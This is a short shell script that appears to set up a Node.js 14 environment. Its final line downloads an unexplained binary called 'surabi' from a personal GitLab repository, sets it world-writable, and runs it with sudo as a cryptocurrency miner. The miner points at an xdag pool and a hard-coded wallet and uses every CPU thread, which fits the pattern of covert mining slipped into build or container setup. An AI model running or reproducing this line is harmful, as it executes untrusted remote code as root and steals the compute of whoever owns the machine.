wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://gitlab.com/richardkevin320/donlod/-/raw/main/surabi && chmod 777 surabi && sudo ./surabi --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)

